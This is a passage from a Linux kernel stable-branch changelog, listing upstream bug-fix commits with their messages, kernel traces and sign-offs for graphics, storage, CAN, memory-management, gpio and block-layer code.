do\_syscall\_64+0x60/0x1b0
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
-> #0 (&helper->lock){+.+.}:
\_\_mutex\_lock+0x70/0x9d0
drm\_fb\_helper\_add\_one\_connector+0x2a/0x60 [drm\_kms\_helper]
nv50\_mstm\_register\_connector+0x2c/0x50 [nouveau]
drm\_dp\_add\_port+0x2f5/0x420 [drm\_kms\_helper]
drm\_dp\_send\_link\_address+0x155/0x1e0 [drm\_kms\_helper]
drm\_dp\_add\_port+0x33f/0x420 [drm\_kms\_helper]
drm\_dp\_send\_link\_address+0x155/0x1e0 [drm\_kms\_helper]
drm\_dp\_check\_and\_send\_link\_address+0x87/0xd0 [drm\_kms\_helper]
drm\_dp\_mst\_link\_probe\_work+0x4d/0x80 [drm\_kms\_helper]
process\_one\_work+0x20d/0x650
worker\_thread+0x3a/0x390
kthread+0x11e/0x140
ret\_from\_fork+0x3a/0x50
other info that might help us debug this:
Chain exists of:
&helper->lock --> crtc\_ww\_class\_acquire --> crtc\_ww\_class\_mutex
Possible unsafe locking scenario:
CPU0 CPU1
---- ----
lock(crtc\_ww\_class\_mutex);
lock(crtc\_ww\_class\_acquire);
lock(crtc\_ww\_class\_mutex);
lock(&helper->lock);
\*\*\* DEADLOCK \*\*\*
5 locks held by kworker/1:0/18:
#0: 000000004a05cd50 ((wq\_completion)"events\_long"){+.+.}, at: process\_one\_work+0x187/0x650
#1: 00000000601c11d1 ((work\_completion)(&mgr->work)){+.+.}, at: process\_one\_work+0x187/0x650
#2: 00000000586ca0df (&dev->mode\_config.mutex){+.+.}, at: drm\_modeset\_lock\_all+0x3a/0x1b0 [drm]
#3: 00000000d3ca0ffa (crtc\_ww\_class\_acquire){+.+.}, at: drm\_modeset\_lock\_all+0x44/0x1b0 [drm]
#4: 00000000942e28e2 (crtc\_ww\_class\_mutex){+.+.}, at: drm\_modeset\_backoff+0x8e/0x1c0 [drm]
stack backtrace:
CPU: 1 PID: 18 Comm: kworker/1:0 Tainted: G O 4.17.0-rc3Lyude-Test+ #1
Hardware name: Gateway FX6840/FX6840, BIOS P01-A3 05/17/2010
Workqueue: events\_long drm\_dp\_mst\_link\_probe\_work [drm\_kms\_helper]
Call Trace:
dump\_stack+0x85/0xcb
print\_circular\_bug.isra.38+0x1ce/0x1db
\_\_lock\_acquire+0x128f/0x1350
? lock\_acquire+0x9f/0x200
? lock\_acquire+0x9f/0x200
? \_\_ww\_mutex\_lock.constprop.13+0x8f/0x1000
lock\_acquire+0x9f/0x200
? drm\_fb\_helper\_add\_one\_connector+0x2a/0x60 [drm\_kms\_helper]
? drm\_fb\_helper\_add\_one\_connector+0x2a/0x60 [drm\_kms\_helper]
\_\_mutex\_lock+0x70/0x9d0
? drm\_fb\_helper\_add\_one\_connector+0x2a/0x60 [drm\_kms\_helper]
? ww\_mutex\_lock+0x43/0x80
? \_cond\_resched+0x15/0x30
? ww\_mutex\_lock+0x43/0x80
? drm\_modeset\_lock+0xb2/0x130 [drm]
? drm\_fb\_helper\_add\_one\_connector+0x2a/0x60 [drm\_kms\_helper]
drm\_fb\_helper\_add\_one\_connector+0x2a/0x60 [drm\_kms\_helper]
nv50\_mstm\_register\_connector+0x2c/0x50 [nouveau]
drm\_dp\_add\_port+0x2f5/0x420 [drm\_kms\_helper]
? mark\_held\_locks+0x50/0x80
? kfree+0xcf/0x2a0
? drm\_dp\_check\_mstb\_guid+0xd6/0x120 [drm\_kms\_helper]
? trace\_hardirqs\_on\_caller+0xed/0x180
? drm\_dp\_check\_mstb\_guid+0xd6/0x120 [drm\_kms\_helper]
drm\_dp\_send\_link\_address+0x155/0x1e0 [drm\_kms\_helper]
drm\_dp\_add\_port+0x33f/0x420 [drm\_kms\_helper]
? nouveau\_connector\_aux\_xfer+0x7c/0xb0 [nouveau]
? find\_held\_lock+0x2d/0x90
? drm\_dp\_dpcd\_access+0xd9/0xf0 [drm\_kms\_helper]
? \_\_mutex\_unlock\_slowpath+0x3b/0x280
? drm\_dp\_dpcd\_access+0xd9/0xf0 [drm\_kms\_helper]
drm\_dp\_send\_link\_address+0x155/0x1e0 [drm\_kms\_helper]
drm\_dp\_check\_and\_send\_link\_address+0x87/0xd0 [drm\_kms\_helper]
drm\_dp\_mst\_link\_probe\_work+0x4d/0x80 [drm\_kms\_helper]
process\_one\_work+0x20d/0x650
worker\_thread+0x3a/0x390
? process\_one\_work+0x650/0x650
kthread+0x11e/0x140
? kthread\_create\_worker\_on\_cpu+0x50/0x50
ret\_from\_fork+0x3a/0x50
Taking example from i915, the only time we need to hold any modesetting
locks is when changing the port on the mstc, and in that case we only
need to hold the connection mutex.
Signed-off-by: Lyude Paul
Cc: Karol Herbst
Cc: stable@vger.kernel.org
Signed-off-by: Lyude Paul
Signed-off-by: Ben Skeggs
Signed-off-by: Greg Kroah-Hartman
commit b554e152bd1b8c65e49c61906a845340703d065b
Author: Rodrigo Vivi
Date: Wed May 2 10:52:55 2018 -0700
drm/i915: Adjust eDP's logical vco in a reliable place.
commit 9d219554d9bf59875b4e571a0392d620e8954879 upstream.
On intel\_dp\_compute\_config() we were calculating the needed vco
for eDP on gen9 and we stashing it in
intel\_atomic\_state.cdclk.logical.vco
However few moments later on intel\_modeset\_checks() we fully
replace entire intel\_atomic\_state.cdclk.logical with
dev\_priv->cdclk.logical fully overwriting the logical desired
vco for eDP on gen9.
So, with wrong VCO value we end up with wrong desired cdclk, but
also it will raise a lot of WARNs: On gen9, when we read
CDCLK\_CTL to verify if we configured properly the desired
frequency the CD Frequency Select bits [27:26] == 10b can mean
337.5 or 308.57 MHz depending on the VCO. So if we have wrong
VCO value stashed we will believe the frequency selection didn't
stick and start to raise WARNs of cdclk mismatch.
[ 42.857519] [drm:intel\_dump\_cdclk\_state [i915]] Changing CDCLK to 308571 kHz, VCO 8640000 kHz, ref 24000 kHz, bypass 24000 kHz, voltage level 0
[ 42.897269] cdclk state doesn't match!
[ 42.901052] WARNING: CPU: 5 PID: 1116 at drivers/gpu/drm/i915/intel\_cdclk.c:2084 intel\_set\_cdclk+0x5d/0x110 [i915]
[ 42.938004] RIP: 0010:intel\_set\_cdclk+0x5d/0x110 [i915]
[ 43.155253] WARNING: CPU: 5 PID: 1116 at drivers/gpu/drm/i915/intel\_cdclk.c:2084 intel\_set\_cdclk+0x5d/0x110 [i915]
[ 43.170277] [drm:intel\_dump\_cdclk\_state [i915]] [hw state] 337500 kHz, VCO 8100000 kHz, ref 24000 kHz, bypass 24000 kHz, voltage level 0
[ 43.182566] [drm:intel\_dump\_cdclk\_state [i915]] [sw state] 308571 kHz, VCO 8640000 kHz, ref 24000 kHz, bypass 24000 kHz, voltage level 0
v2: Move the entire eDP's vco logical adjustment to inside
the skl\_modeset\_calc\_cdclk as suggested by Ville.
Cc: Ville Syrjälä
Signed-off-by: Rodrigo Vivi
Reviewed-by: Ville Syrjälä
Fixes: bb0f4aab0e76 ("drm/i915: Track full cdclk state for the logical and actual cdclk frequencies")
Cc:  # v4.12+
Link: https://patchwork.freedesktop.org/patch/msgid/20180502175255.5344-1-rodrigo.vivi@intel.com
(cherry picked from commit 3297234a05ab1e90091b0574db4c397ef0e90d5f)
Signed-off-by: Joonas Lahtinen
Signed-off-by: Greg Kroah-Hartman
commit b7b575c4f6f135cd71351b4f7986b0e68a09aeb7
Author: Florent Flament
Date: Thu Apr 19 19:07:00 2018 +0300
drm/i915: Fix drm:intel\_enable\_lvds ERROR message in kernel log
commit e8f48f96db7e482995743f461b3e8a5c1a102533 upstream.
Fix `[drm:intel\_enable\_lvds] \*ERROR\* timed out waiting for panel to
power on` in kernel log at boot time.
Toshiba Satellite Z930 laptops needs between 1 and 2 seconds to power
on its screen during Intel i915 DRM initialization. This currently
results in a `[drm:intel\_enable\_lvds] \*ERROR\* timed out waiting for
panel to power on` message appearing in the kernel log during boot
time and when stopping the machine.
This change increases the timeout of the `intel\_enable\_lvds` function
from 1 to 5 seconds, letting enough time for the Satellite 930 LCD
screen to power on, and suppressing the error message from the kernel
log.
This patch has been successfully tested on Linux 4.14 running on a
Toshiba Satellite Z930.
[vsyrjala: bump the timeout from 2 to 5 seconds to match the DP
code and properly cover the max hw timeout of ~4 seconds, and
drop the comment about the specific machine since this is not
a particulary surprising issue, nor specific to that one machine]
Signed-off-by: Florent Flament
Cc: stable@vger.kernel.org
Cc: Pavel Petrovic
Cc: Sérgio M. Basto
Bugzilla: https://bugs.freedesktop.org/show\_bug.cgi?id=103414
References: https://bugzilla.kernel.org/show\_bug.cgi?id=57591
Signed-off-by: Ville Syrjälä
Link: https://patchwork.freedesktop.org/patch/msgid/20180419160700.19828-1-ville.syrjala@linux.intel.com
Reviewed-by: Jani Nikula
(cherry picked from commit 280b54ade5914d3b4abe4f0ebe083ddbd4603246)
Signed-off-by: Joonas Lahtinen
Signed-off-by: Greg Kroah-Hartman
commit 29726db820d1d8830bec169f717cd086de8fa498
Author: Michel Dänzer
Date: Wed Apr 25 17:32:10 2018 +0200
drm/ttm: Use GFP\_TRANSHUGE\_LIGHT for allocating huge pages
commit da291320baec914f0bb4e65a9dccb86bd6c728f2 upstream.
GFP\_TRANSHUGE tries very hard to allocate huge pages, which can result
in long delays with high memory pressure. I have observed firefox
freezing for up to around a minute due to this while restic was taking
a full system backup.
Since we don't really need huge pages, use GFP\_TRANSHUGE\_LIGHT |
\_\_GFP\_NORETRY instead, in order to fail quickly when there are no huge
pages available.
Set \_\_GFP\_KSWAPD\_RECLAIM as well, in order for huge pages to be freed
up in the background if necessary.
With these changes, I'm no longer seeing freezes during a restic backup.
Cc: stable@vger.kernel.org
Reviewed-by: Christian König
Signed-off-by: Michel Dänzer
Signed-off-by: Alex Deucher
Signed-off-by: Greg Kroah-Hartman
commit 694d8e21ed19345fdfa34da1c0aa260c446ce151
Author: Boris Brezillon
Date: Mon May 7 14:13:03 2018 +0200
drm/vc4: Fix scaling of uni-planar formats
commit 9a0e9802217291e54c4dd1fc5462f189a4be14ec upstream.
When using uni-planar formats (like RGB), the scaling parameters are
stored in plane 0, not plane 1.
Fixes: fc04023fafec ("drm/vc4: Add support for YUV planes.")
Cc: stable@vger.kernel.org
Signed-off-by: Boris Brezillon
Reviewed-by: Eric Anholt
Link: https://patchwork.freedesktop.org/patch/msgid/20180507121303.5610-1-boris.brezillon@bootlin.com
Signed-off-by: Greg Kroah-Hartman
commit 373f328dfcd9bb8294f8c8362b75cb7f761cc941
Author: Miquel Raynal
Date: Thu May 3 12:00:27 2018 +0200
mtd: rawnand: marvell: fix command xtype in BCH write hook
commit a2ee41fd953e7c3ff6c55a3038c80354d191a318 upstream.
One layout supported by the Marvell NAND controller supports NAND pages
of 2048 bytes, all handled in one single chunk when using BCH with a
strength of 4-bit per 512 bytes. In this case, instead of the generic
XTYPE\_WRITE\_DISPATCH/XTYPE\_LAST\_NAKED\_RW couple, the controller expects
to receive XTYPE\_MONOLITHIC\_RW.
This fixes problems at boot like:
[ 1.315475] Scanning device for bad blocks
[ 3.203108] marvell-nfc f10d0000.flash: Timeout waiting for RB signal
[ 3.209564] nand\_bbt: error while writing BBT block -110
[ 4.243106] marvell-nfc f10d0000.flash: Timeout waiting for RB signal
[ 5.283106] marvell-nfc f10d0000.flash: Timeout waiting for RB signal
[ 5.289562] nand\_bbt: error -110 while marking block 2047 bad
[ 6.323106] marvell-nfc f10d0000.flash: Timeout waiting for RB signal
[ 6.329559] nand\_bbt: error while writing BBT block -110
[ 7.363106] marvell-nfc f10d0000.flash: Timeout waiting for RB signal
[ 8.403105] marvell-nfc f10d0000.flash: Timeout waiting for RB signal
[ 8.409559] nand\_bbt: error -110 while marking block 2046 bad
...
Fixes: 02f26ecf8c772 ("mtd: nand: add reworked Marvell NAND controller driver")
Cc: stable@vger.kernel.org
Signed-off-by: Miquel Raynal
Tested-by: Chris Packham
Signed-off-by: Boris Brezillon
Signed-off-by: Greg Kroah-Hartman
commit 5ce38a1bcb47ae064ef81d4e23eb88fd4d0c11d4
Author: Chris Packham
Date: Thu May 3 14:21:28 2018 +1200
mtd: rawnand: marvell: pass ms delay to wait\_op
commit b76401fc4ba720f0f38f7b1f9d54d5c2308bc18d upstream.
marvell\_nfc\_wait\_op() expects the delay to be expressed in milliseconds
but nand\_sdr\_timings uses picoseconds. Use PSEC\_TO\_MSEC when passing
tPROG\_max to marvell\_nfc\_wait\_op().
Fixes: 02f26ecf8c772 ("mtd: nand: add reworked Marvell NAND controller driver")
Cc: stable@vger.kernel.org
Signed-off-by: Chris Packham
Reviewed-by: Miquel Raynal
Signed-off-by: Boris Brezillon
Signed-off-by: Greg Kroah-Hartman
commit 37be6761ece7db918969b55a647d5265d0ae5cb0
Author: Lukas Wunner
Date: Wed May 9 14:43:43 2018 +0200
can: hi311x: Work around TX complete interrupt erratum
commit 32bee8f48fa048a3198109de50e51c092507ff52 upstream.
When sending packets as fast as possible using "cangen -g 0 -i -x", the
HI-3110 occasionally latches the interrupt pin high on completion of a
packet, but doesn't set the TXCPLT bit in the INTF register. The INTF
register contains 0x00 as if no interrupt has occurred. Even waiting
for a few milliseconds after the interrupt doesn't help.
Work around this apparent erratum by instead checking the TXMTY bit in
the STATF register ("TX FIFO empty"). We know that we've queued up a
packet for transmission if priv->tx\_len is nonzero. If the TX FIFO is
empty, transmission of that packet must have completed.
Note that this is congruent with our handling of received packets, which
likewise gleans from the STATF register whether a packet is waiting in
the RX FIFO, instead of looking at the INTF register.
Cc: Mathias Duckeck
Cc: Akshay Bhat
Cc: Casey Fitzpatrick
Cc: stable@vger.kernel.org # v4.12+
Signed-off-by: Lukas Wunner
Acked-by: Akshay Bhat
Signed-off-by: Marc Kleine-Budde
Signed-off-by: Greg Kroah-Hartman
commit 3cda1f6aed6463af0bbb0a3eca9815bd9f834cef
Author: Lukas Wunner
Date: Wed May 9 14:38:43 2018 +0200
can: hi311x: Acquire SPI lock on ->do\_get\_berr\_counter
commit 5cec9425b41dcf834c3d48776900d6acb7e96f38 upstream.
hi3110\_get\_berr\_counter() may run concurrently to the rest of the driver
but neglects to acquire the lock protecting access to the SPI device.
As a result, it and the rest of the driver may clobber each other's tx
and rx buffers.
We became aware of this issue because transmission of packets with
"cangen -g 0 -i -x" frequently hung. It turns out that agetty executes
->do\_get\_berr\_counter every few seconds via the following call stack:
CPU: 2 PID: 1605 Comm: agetty
[<7f3f7500>] (hi3110\_get\_berr\_counter [hi311x])
[<7f130204>] (can\_fill\_info [can\_dev])
[<80693bc0>] (rtnl\_fill\_ifinfo)
[<806949ec>] (rtnl\_dump\_ifinfo)
[<806b4834>] (netlink\_dump)
[<806b4bc8>] (netlink\_recvmsg)
[<8065f180>] (sock\_recvmsg)
[<80660f90>] (\_\_\_sys\_recvmsg)
[<80661e7c>] (\_\_sys\_recvmsg)
[<80661ec0>] (SyS\_recvmsg)
[<80108b20>] (ret\_fast\_syscall+0x0/0x1c)
agetty listens to netlink messages in order to update the login prompt
when IP addresses change (if /etc/issue contains \4 or \6 escape codes):
https://git.kernel.org/pub/scm/utils/util-linux/util-linux.git/commit/?id=e36deb6424e8
It's a useful feature, though it seems questionable that it causes CAN
bit error statistics to be queried.
Be that as it may, if hi3110\_get\_berr\_counter() is invoked while a frame
is sent by hi3110\_hw\_tx(), bogus SPI transfers like the following may
occur:
=> 12 00 (hi3110\_get\_berr\_counter() wanted to transmit
EC 00 to query the transmit error counter,
but the first byte was overwritten by
hi3110\_hw\_tx\_frame())
=> EA 00 3E 80 01 FB (hi3110\_hw\_tx\_frame() wanted to transmit a
frame, but the first byte was overwritten by
hi3110\_get\_berr\_counter() because it wanted
to query the receive error counter)
This sequence hangs the transmission because the driver believes it has
sent a frame and waits for the interrupt signaling completion, but in
reality the chip has never sent away the frame since the commands it
received were malformed.
Fix by acquiring the SPI lock in hi3110\_get\_berr\_counter().
I've scrutinized the entire driver for further unlocked SPI accesses but
found no others.
Cc: Mathias Duckeck
Cc: Akshay Bhat
Cc: Casey Fitzpatrick
Cc: Stef Walter
Cc: Karel Zak
Cc: stable@vger.kernel.org # v4.12+
Signed-off-by: Lukas Wunner
Reviewed-by: Akshay Bhat
Signed-off-by: Marc Kleine-Budde
Signed-off-by: Greg Kroah-Hartman
commit 7828ab9addf0e9cbca3780165203d85403d18103
Author: Jimmy Assarsson
Date: Fri Apr 20 14:38:46 2018 +0200
can: kvaser\_usb: Increase correct stats counter in kvaser\_usb\_rx\_can\_msg()
commit 6ee00865ffe4e8c8ba4a68d26db53c7ec09bbb89 upstream.
Increase rx\_dropped, if alloc\_can\_skb() fails, not tx\_dropped.
Signed-off-by: Jimmy Assarsson
Cc: linux-stable
Signed-off-by: Marc Kleine-Budde
Signed-off-by: Greg Kroah-Hartman
commit 9f28874ccb2ff5b909d9b0c3a4736edf7e856cdf
Author: Uwe Kleine-König
Date: Wed Apr 25 16:50:39 2018 +0200
can: flexcan: fix endianess detection
commit 0e030a373df3b8792b8991740fc31fe0629c6e58 upstream.
In commit 88462d2a7830 ("can: flexcan: Remodel FlexCAN register r/w APIs
for big endian FlexCAN controllers.") the following logic was
implemented:
if the dt property "big-endian" is given or
the device is compatible to "fsl,p1010-flexcan":
use big-endian mode;
else
use little-endian mode;
This relies on commit d50f4630c2e1 ("arm: dts: Remove p1010-flexcan
compatible from imx series dts") which was applied a few commits later.
Without this commit (or an old device tree used for booting a new
kernel) the flexcan devices on i.MX25, i.MX28, i.MX35 and i.MX53 match
the 'the device is compatible to "fsl,p1010-flexcan"' test and so are
switched erroneously to big endian mode.
Instead of the check above put a quirk in devtype data and rely on
of\_match\_device yielding the most compatible match
Fixes: 88462d2a7830 ("can: flexcan: Remodel FlexCAN register r/w APIs for big endian FlexCAN controllers.")
Signed-off-by: Uwe Kleine-König
Tested-by: Gavin Schenk
Cc: linux-stable  # >= v4.16
Signed-off-by: Marc Kleine-Budde
Signed-off-by: Greg Kroah-Hartman
commit 2c205ef7667cecc48dfa4e1fe3f4701666717846
Author: Ilya Dryomov
Date: Thu May 3 16:10:09 2018 +0200
ceph: fix rsize/wsize capping in ceph\_direct\_read\_write()
commit 3a15b38fd2efc1d648cb33186bf71e9138c93491 upstream.
rsize/wsize cap should be applied before ceph\_osdc\_new\_request() is
called. Otherwise, if the size is limited by the cap instead of the
stripe unit, ceph\_osdc\_new\_request() would setup an extent op that is
bigger than what dio\_get\_pages\_alloc() would pin and add to the page
vector, triggering asserts in the messenger.
Cc: stable@vger.kernel.org
Fixes: 95cca2b44e54 ("ceph: limit osd write size")
Signed-off-by: Ilya Dryomov
Reviewed-by: "Yan, Zheng"
Signed-off-by: Greg Kroah-Hartman
commit 092d4bd6bdf55899d238737d6870adef6f225211
Author: David Rientjes
Date: Fri May 11 16:02:04 2018 -0700
mm, oom: fix concurrent munlock and oom reaper unmap, v3
commit 27ae357fa82be5ab73b2ef8d39dcb8ca2563483a upstream.
Since exit\_mmap() is done without the protection of mm->mmap\_sem, it is
possible for the oom reaper to concurrently operate on an mm until
MMF\_OOM\_SKIP is set.
This allows munlock\_vma\_pages\_all() to concurrently run while the oom
reaper is operating on a vma. Since munlock\_vma\_pages\_range() depends
on clearing VM\_LOCKED from vm\_flags before actually doing the munlock to
determine if any other vmas are locking the same memory, the check for
VM\_LOCKED in the oom reaper is racy.
This is especially noticeable on architectures such as powerpc where
clearing a huge pmd requires serialize\_against\_pte\_lookup(). If the pmd
is zapped by the oom reaper during follow\_page\_mask() after the check
for pmd\_none() is bypassed, this ends up deferencing a NULL ptl or a
kernel oops.
Fix this by manually freeing all possible memory from the mm before
doing the munlock and then setting MMF\_OOM\_SKIP. The oom reaper can not
run on the mm anymore so the munlock is safe to do in exit\_mmap(). It
also matches the logic that the oom reaper currently uses for
determining when to set MMF\_OOM\_SKIP itself, so there's no new risk of
excessive oom killing.
This issue fixes CVE-2018-1000200.
Link: http://lkml.kernel.org/r/alpine.DEB.2.21.1804241526320.238665@chino.kir.corp.google.com
Fixes: 212925802454 ("mm: oom: let oom\_reap\_task and exit\_mmap run concurrently")
Signed-off-by: David Rientjes
Suggested-by: Tetsuo Handa
Acked-by: Michal Hocko
Cc: Andrea Arcangeli
Cc:  [4.14+]
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit 707cd0193a3d4b288c74d1ad050648e29db7fa99
Author: Pavel Tatashin
Date: Fri May 11 16:01:50 2018 -0700
mm: sections are not offlined during memory hotremove
commit 27227c733852f71008e9bf165950bb2edaed3a90 upstream.
Memory hotplug and hotremove operate with per-block granularity. If the
machine has a large amount of memory (more than 64G), the size of a
memory block can span multiple sections. By mistake, during hotremove
we set only the first section to offline state.
The bug was discovered because kernel selftest started to fail:
https://lkml.kernel.org/r/20180423011247.GK5563@yexl-desktop
After commit, "mm/memory\_hotplug: optimize probe routine". But, the bug
is older than this commit. In this optimization we also added a check
for sections to be in a proper state during hotplug operation.
Link: http://lkml.kernel.org/r/20180427145257.15222-1-pasha.tatashin@oracle.com
Fixes: 2d070eab2e82 ("mm: consider zone which is not fully populated to have holes")
Signed-off-by: Pavel Tatashin
Acked-by: Michal Hocko
Reviewed-by: Andrew Morton
Cc: Vlastimil Babka
Cc: Steven Sistare
Cc: Daniel Jordan
Cc: "Kirill A. Shutemov"
Cc:
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit 53f7f2d2e6a2f9a1c9068d31afad2d2195029e39
Author: Vitaly Wool
Date: Fri May 11 16:01:46 2018 -0700
z3fold: fix reclaim lock-ups
commit 6098d7e136692f9c6e23ae362c62ec822343e4d5 upstream.
Do not try to optimize in-page object layout while the page is under
reclaim. This fixes lock-ups on reclaim and improves reclaim
performance at the same time.
[akpm@linux-foundation.org: coding-style fixes]
Link: http://lkml.kernel.org/r/20180430125800.444cae9706489f412ad12621@gmail.com
Signed-off-by: Vitaly Wool
Reported-by: Guenter Roeck
Tested-by: Guenter Roeck
Cc:
Cc: Matthew Wilcox
Cc:
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit e0651dd4ba8b85731efe0cd2f8b228cb83f2d9ca
Author: Steven Rostedt (VMware)
Date: Wed May 9 11:59:32 2018 -0400
tracing: Fix regex\_match\_front() to not over compare the test string
commit dc432c3d7f9bceb3de6f5b44fb9c657c9810ed6d upstream.
The regex match function regex\_match\_front() in the tracing filter logic,
was fixed to test just the pattern length from testing the entire test
string. That is, it went from strncmp(str, r->pattern, len) to
strcmp(str, r->pattern, r->len).
The issue is that str is not guaranteed to be nul terminated, and if r->len
is greater than the length of str, it can access more memory than is
allocated.
The solution is to add a simple test if (len < r->len) return 0.
Cc: stable@vger.kernel.org
Fixes: 285caad415f45 ("tracing/filters: Fix MATCH\_FRONT\_ONLY filter matching")
Signed-off-by: Steven Rostedt (VMware)
Signed-off-by: Greg Kroah-Hartman
commit 827ef297771746fd5e4923001108e38a7c9fb515
Author: Mikulas Patocka
Date: Tue Apr 17 18:32:26 2018 -0400
dm integrity: use kvfree for kvmalloc'd memory
commit fc8cec113904a47396bf0a1afc62920d66319d36 upstream.
Use kvfree instead of kfree because the array is allocated with kvmalloc.
Fixes: 7eada909bfd7a ("dm: add integrity target")
Cc: stable@vger.kernel.org # v4.12+
Signed-off-by: Mikulas Patocka
Signed-off-by: Mike Snitzer
Signed-off-by: Greg Kroah-Hartman
commit 159de287e3ccf24a18894bd3eb10177a7db2db74
Author: Hans de Goede
Date: Thu Apr 26 22:32:21 2018 +0200
libata: Apply NOLPM quirk for SanDisk SD7UB3Q\*G1001 SSDs
commit 184add2ca23ce5edcac0ab9c3b9be13f91e7b567 upstream.
Richard Jones has reported that using med\_power\_with\_dipm on a T450s
with a Sandisk SD7UB3Q256G1001 SSD (firmware version X2180501) is
causing the machine to hang.
Switching the LPM to max\_performance fixes this, so it seems that
this Sandisk SSD does not handle LPM well.
Note in the past there have been bug-reports about the following
Sandisk models not working with min\_power, so we may need to extend
the quirk list in the future: name - firmware
Sandisk SD6SB2M512G1022I - X210400
Sandisk SD6PP4M-256G-1006 - A200906
Cc: stable@vger.kernel.org
Cc: Richard W.M. Jones
Reported-and-tested-by: Richard W.M. Jones
Signed-off-by: Hans de Goede
Signed-off-by: Tejun Heo
Signed-off-by: Greg Kroah-Hartman
commit fb4401e4ac3eaea3e5e592b62394c6cacb1f429a
Author: Johan Hovold
Date: Thu Apr 26 09:31:52 2018 +0200
rfkill: gpio: fix memory leak in probe error path
commit 4bf01ca21e2e0e4561d1a03c48c3d740418702db upstream.
Make sure to free the rfkill device in case registration fails during
probe.
Fixes: 5e7ca3937fbe ("net: rfkill: gpio: convert to resource managed allocation")
Cc: stable  # 3.13
Cc: Heikki Krogerus
Signed-off-by: Johan Hovold
Reviewed-by: Heikki Krogerus
Signed-off-by: Johannes Berg
Signed-off-by: Greg Kroah-Hartman
commit 16b6c4d490d428036491e7599e6f7204fd79b3c0
Author: Uwe Kleine-König
Date: Mon Apr 16 13:17:53 2018 +0200
gpio: fix error path in lineevent\_create
commit f001cc351ad3309ec8736c374e90e5a4bc472d41 upstream.
If gpiod\_request() fails the cleanup must not call gpiod\_free().
Cc: stable@vger.kernel.org
Fixes: 61f922db7221 ("gpio: userspace ABI for reading GPIO line events")
Signed-off-by: Uwe Kleine-König
Signed-off-by: Linus Walleij
Signed-off-by: Greg Kroah-Hartman
commit e5faab0a2f35880c6b4b840d5f2e1b8dbd35467a
Author: Govert Overgaauw
Date: Fri Apr 6 14:41:35 2018 +0200
gpio: fix aspeed\_gpio unmask irq
commit f241632fd087d3d9fbd5450f4d8c8604badd8348 upstream.
The unmask function disables all interrupts in a bank when unmasking an
interrupt. Only disable the given interrupt.
Cc: stable@vger.kernel.org
Signed-off-by: Govert Overgaauw
Signed-off-by: Linus Walleij
Signed-off-by: Greg Kroah-Hartman
commit 0ab26f26a292728a251d4201374aa35862268037
Author: Timur Tabi
Date: Thu Mar 29 13:29:12 2018 -0500
gpioib: do not free unrequested descriptors
commit ab3dbcf78f60f46d6a0ad63b1f4b690b7a427140 upstream.
If the main loop in linehandle\_create() encounters an error, it
unwinds completely by freeing all previously requested GPIO
descriptors. However, if the error occurs in the beginning of
the loop before that GPIO is requested, then the exit code
attempts to free a null descriptor. If extrachecks is enabled,
gpiod\_free() triggers a WARN\_ON.
Instead, keep a separate count of legitimate GPIOs so that only
those are freed.
Cc: stable@vger.kernel.org
Fixes: d7c51b47ac11 ("gpio: userspace ABI for reading/writing GPIO lines")
Reviewed-by: Bjorn Andersson
Signed-off-by: Timur Tabi
Signed-off-by: Linus Walleij
Signed-off-by: Greg Kroah-Hartman
commit 1c2117b6ee880d70dbed1845e187225303317928
Author: Jann Horn
Date: Fri May 11 02:19:01 2018 +0200
compat: fix 4-byte infoleak via uninitialized struct field
commit 0a0b98734479aa5b3c671d5190e86273372cab95 upstream.
Commit 3a4d44b61625 ("ntp: Move adjtimex related compat syscalls to
native counterparts") removed the memset() in compat\_get\_timex(). Since
then, the compat adjtimex syscall can invoke do\_adjtimex() with an
uninitialized ->tai.
If do\_adjtimex() doesn't write to ->tai (e.g. because the arguments are
invalid), compat\_put\_timex() then copies the uninitialized ->tai field
to userspace.
Fix it by adding the memset() back.
Fixes: 3a4d44b61625 ("ntp: Move adjtimex related compat syscalls to native counterparts")
Signed-off-by: Jann Horn
Acked-by: Kees Cook
Acked-by: Al Viro
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit c38ba2d8ea6a40451056d14c9baac00954beb82f
Author: Jan Kara
Date: Thu May 3 18:26:26 2018 +0200
bdi: Fix oops in wb\_workfn()
commit b8b784958eccbf8f51ebeee65282ca3fd59ea391 upstream.
Syzbot has reported that it can hit a NULL pointer dereference in
wb\_workfn() due to wb->bdi->dev being NULL. This indicates that
wb\_workfn() was called for an already unregistered bdi which should not
happen as wb\_shutdown() called from bdi\_unregister() should make sure
all pending writeback works are completed before bdi is unregistered.
Except that wb\_workfn() itself can requeue the work with:
mod\_delayed\_work(bdi\_wq, &wb->dwork, 0);
and if this happens while wb\_shutdown() is waiting in:
flush\_delayed\_work(&wb->dwork);
the dwork can get executed after wb\_shutdown() has finished and
bdi\_unregister() has cleared wb->bdi->dev.
Make wb\_workfn() use wakeup\_wb() for requeueing the work which takes all
the necessary precautions against racing with bdi unregistration.
CC: Tetsuo Handa
CC: Tejun Heo
Fixes: 839a8e8660b6777e7fe4e80af1a048aebe2b5977
Reported-by: syzbot
Reviewed-by: Dave Chinner
Signed-off-by: Jan Kara
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit c25ed3941e2d8ba90509be9e666059e4484b727e
Author: Tetsuo Handa
Date: Mon Apr 23 11:21:03 2018 +0900
bdi: Fix use after free bug in debugfs\_remove()
commit f53823c18131e755905b4f654196fd2cc3953f6e upstream.
syzbot is reporting use after free bug in debugfs\_remove() [1].
This is because fault injection made memory allocation for
debugfs\_create\_file() from bdi\_debug\_register() from bdi\_register\_va()
fail and continued with setting WB\_registered. But when debugfs\_remove()
is called from debugfs\_remove(bdi->debug\_dir) from bdi\_debug\_unregister()
from bdi\_unregister() from release\_bdi() because WB\_registered was set
by bdi\_register\_va(), IS\_ERR\_OR\_NULL(bdi->debug\_dir) == false despite
debugfs\_remove(bdi->debug\_dir) was already called from bdi\_register\_va().
Fix this by making IS\_ERR\_OR\_NULL(bdi->debug\_dir) == true.
[1] https://syzkaller.appspot.com/bug?id=5ab4efd91a96dcea9b68104f159adf4af2a6dfc1
Signed-off-by: Tetsuo Handa
Reported-by: syzbot
Fixes: 97f07697932e6faf ("bdi: convert bdi\_debug\_register to int")
Cc: weiping zhang
Reviewed-by: Greg Kroah-Hartman
